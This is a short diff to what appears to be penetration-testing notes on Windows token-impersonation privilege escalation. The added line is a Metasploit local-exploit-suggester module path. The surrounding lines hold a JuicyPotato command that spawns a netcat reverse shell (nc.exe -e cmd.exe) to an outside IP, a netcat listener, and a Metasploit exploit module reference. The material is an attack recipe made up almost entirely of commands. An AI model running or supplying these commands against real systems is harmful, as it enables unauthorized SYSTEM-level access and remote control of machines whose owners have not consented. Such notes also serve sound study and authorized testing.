@@ -55,6 +55,8 @@ HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
 .\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.14.150 4141" -t *
 sudo nc -lnvp 8443
 
+post/multi/recon/local_exploit_suggester
+
 [use exploit/windows/local/ms16_075_reflection_juicy](https://github.com/hardsoftsecurity/Offensive-Security-Tools/tree/main/TokenExploitation)
 ```
 
